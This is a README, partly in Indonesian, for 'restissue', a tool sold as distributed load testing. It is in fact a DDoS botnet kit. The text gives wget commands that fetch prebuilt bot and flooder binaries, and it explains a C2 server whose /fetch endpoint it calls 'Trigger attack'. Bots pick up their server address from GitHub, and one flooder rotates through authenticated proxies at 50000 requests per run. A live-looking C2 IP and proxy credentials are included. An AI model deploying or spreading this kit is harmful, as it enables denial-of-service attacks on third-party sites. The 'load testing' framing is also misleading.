# restissue

Distributed load testing tool with C2 server, HTTP/1 (`tls-raw`) and HTTP/2 + proxy (`tls-fler`) methods.

---

## Methods

| Binary | Method | Protocol | Proxy |
|--------|--------|----------|-------|
| `./up` | `tls-raw` | HTTP/1 + TLS (fasthttp) | No |
| `./tls-fler` | `tls-fler` | HTTP/2 + TLS | Yes (auto-rotate from `proxy/global.txt`) |

---

## Setup

### 1. Download binaries

```bash
# bot (C2 client)
wget https://github.com/malasahjagotwin/restissue/raw/refs/heads/master/bin/bot -O bot && chmod +x bot

# tls-raw (HTTP/1)
wget https://github.com/malasahjagotwin/restissue/raw/refs/heads/master/bin/up -O up && chmod +x up

# tls-fler (HTTP/2 + proxy)
wget https://github.com/malasahjagotwin/restissue/raw/refs/heads/master/bin/tls-fler -O tls-fler && chmod +x tls-fler
```

### 2. Download proxy list

```bash
mkdir -p proxy
wget https://raw.githubusercontent.com/malasahjagotwin/restissue/refs/heads/master/proxy/global.txt -O proxy/global.txt
```

> `tls-fler` akan otomatis cek & update `proxy/global.txt` dari GitHub setiap 30 detik jika ada perubahan.

---

## Running

### Bot (C2 client)

Bot tidak perlu flag. IP:port server diambil otomatis dari GitHub (`server/addr.txt`) dan auto-reconnect jika berubah.

```bash
./bot
```

Bot akan polling `server/addr.txt` setiap 15 detik. Jika addr berubah, bot otomatis disconnect dan reconnect ke server baru.

---

### tls-raw (HTTP/1)

```bash
./up <host> <duration_seconds> <rate>
```

```bash
# Contoh
./up https://example.com 60 50000
```

---

### tls-fler (HTTP/2 + proxy rotasi)

```bash
./tls-fler <host> <duration_seconds> <rate>
```

```bash
# Contoh
./tls-fler https://example.com 60 50000
```

---

## C2 Server

### Jalankan server

```bash
./server -p <port>
```

```bash
# Contoh
./server -p 8080
```

### Trigger attack via /fetch

```bash
curl "http://<server_ip>:<port>/fetch?host=https://example.com&duration=60&method=tls-raw"
```

Response:
```json
{
  "host": "https://example.com",
  "duration": "60",
  "method": "tls-raw",
  "bots_sent": 5,
  "bots_online": 5
}
```

---

## Update Proxy

Edit `proxy/global.txt` di GitHub dan commit. `tls-fler` yang sedang berjalan akan otomatis mendeteksi perubahan dan memperbarui daftar proxy dalam 30 detik.

Format proxy (`ip:port:user:pass`):
```
31.59.20.176:6754:znepvsaz:nxvdfiogh158
```

## Update Server Address

Edit `server/addr.txt` di GitHub dan commit. Semua bot yang sedang berjalan akan otomatis reconnect ke server baru dalam 15 detik.

Format (`ip:port`):
```
23.156.136.115:3071
```
